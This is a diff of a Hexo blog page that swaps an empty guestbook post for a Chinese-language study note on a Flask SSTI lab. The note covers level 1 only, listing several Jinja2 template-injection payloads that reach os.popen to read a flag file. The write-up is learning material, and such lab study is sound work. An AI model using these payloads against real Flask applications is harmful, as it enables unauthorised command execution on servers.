@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2025/01/21/留言板/"/>
+  <link rel="canonical" href="http://example.com/2025/03/25/ssti-flask-labs/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,17 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>留言板 - Hexo</title>
+  <title>SSTI-flask-labs - Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="留言板">
-<meta property="og:url" content="http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI-flask-labs">
+<meta property="og:url" content="http://example.com/2025/03/25/SSTI-flask-labs/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SSTI-labs笔记前言实在草率了，没想到SSTI有点难，那些模块，子类，函数实在太多了。根本没有什么做题思路，还是得从头开始，去了解一些做题思路 1关 调用os模块首先是一个输入框，我们不可能在输入框中查看结果，查看页面源码，发现通过POST方式去传递了code参数，我们尝试&#123;&#123;7*7&#125;&#125;，发现回显49，证明存在SSTI注入 这次没有过滤，所以有很多种方">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2025-01-21T09:17:52.000Z">
-<meta property="article:modified_time" content="2025-01-21T09:17:52.592Z">
+<meta property="article:published_time" content="2025-03-25T08:16:06.000Z">
+<meta property="article:modified_time" content="2025-03-27T10:57:56.511Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2515,7 +2517,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/21/留言板/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/25/SSTI-flask-labs/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2536,7 +2538,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        留言板
+        SSTI-flask-labs
       </h1>
       <div class='new-meta-box'>
         
@@ -2557,10 +2559,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-01-21T17:17:52+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-03-25T16:16:06+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Jan 21, 2025</p>
+    <p>发布于：Mar 25, 2025</p>
   </a>
 </div>
 
@@ -2583,7 +2585,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    
+    <h1 id="SSTI-labs笔记"><a href="#SSTI-labs笔记" class="headerlink" title="SSTI-labs笔记"></a>SSTI-labs笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实在草率了，没想到SSTI有点难，那些模块，子类，函数实在太多了。根本没有什么做题思路，还是得从头开始，去了解一些做题思路</p>
+<h2 id="1关-调用os模块"><a href="#1关-调用os模块" class="headerlink" title="1关 调用os模块"></a>1关 调用os模块</h2><p>首先是一个输入框，我们不可能在输入框中查看结果，查看页面源码，发现通过POST方式去传递了code参数，我们尝试<code>&#123;&#123;7*7&#125;&#125;</code>，发现回显49，证明存在SSTI注入</p>
+<p>这次没有过滤，所以有很多种方法，我们都写一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最简单的应该是popen直接命令执行，通过脚本跑出其所在子类</span></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#我们再试下os._wrap_close子类</span></span><br><span class="line"><span class="comment">#有点尴尬，os._wrap_close这个子类就是包含popen这个函数的子类，所以这和第一个方法一样</span></span><br><span class="line"><span class="comment">#方法2 lipsum这个是python下面系统的一个固定函数，在其全局变量中可以找到os模块</span></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#我们也可以使用config</span></span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#还有url_for</span></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment">#文件读取太简单了，算了</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2关-过滤大括号"><a href="#2关-过滤大括号" class="headerlink" title="2关 过滤大括号"></a>2关 过滤大括号</h2>
   </div>
   
   
@@ -2607,10 +2616,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-01-21T17:17:52+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-27T18:57:56+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jan 21, 2025</p>
+    <p>更新于：Mar 27, 2025</p>
   </a>
 </div>
 
@@ -2629,7 +2638,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/&title=留言板 - Hexo&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2025/03/25/SSTI-flask-labs/&title=SSTI-flask-labs - Hexo&summary="
           
           >
           
@@ -2641,7 +2650,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/&title=留言板 - Hexo&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2025/03/25/SSTI-flask-labs/&title=SSTI-flask-labs - Hexo&summary="
           
           >
           
@@ -2653,7 +2662,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/&title=留言板 - Hexo&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2025/03/25/SSTI-flask-labs/&title=SSTI-flask-labs - Hexo&summary="
           
           >
           
@@ -2686,20 +2695,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2025/02/01/linux%E5%91%BD%E4%BB%A4/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>linux命令</p>
-          <p class='content'>linux命令笔记前言目前对linux命令感到抽象，因为我是windows系统，而且我没装虚拟机，感觉好难装，但是没装不影响学，可以使用在线命令
-1.linux系统目录结构1.Linux一切皆文...</p>
-        </a>
       
-      
-        <a class='next' href='/2025/01/15/Buuctf/'>
-          <p class='title'>Buuctf<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>buuctf笔记前言此笔记用于记录在buuctf web上做题的笔记与题解
-1.[极客大挑战 2019]EasySQL第一题当然是最简单的，一个普通的万能密码即可
-
-
-此关必须输入用户名和密码，...</p>
+        <a class='next' href='/2025/03/23/SSTI/'>
+          <p class='title'>SSTI<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>SSTI学习笔记前言到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下。刚才去试了一下，果然...</p>
         </a>
       
     </div>
@@ -2715,7 +2714,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2025/03/25/SSTI-flask-labs/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2747,9 +2746,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
 
 
-  <div class="">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%85%B3-%E8%B0%83%E7%94%A8os%E6%A8%A1%E5%9D%97"><span class="toc-text">1关 调用os模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%85%B3-%E8%BF%87%E6%BB%A4%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-text">2关 过滤大括号</span></a></li></ol>
+    </div>
+  </section>
 
   
 
@@ -3317,7 +3326,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/01/21/留言板/","name":"留言板"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"留言板","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/01/21/%E7%95%99%E8%A8%80%E6%9D%BF/","wordCount":0,"datePublished":"2025-01-21T09:17:52.000Z","dateModified":"2025-01-21T09:17:52.592Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/25/SSTI-flask-labs/","name":"SSTI-flask-labs"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SSTI-flask-labs","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/25/SSTI-flask-labs/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/25/SSTI-flask-labs/","wordCount":0,"datePublished":"2025-03-25T08:16:06.000Z","dateModified":"2025-03-27T10:57:56.511Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
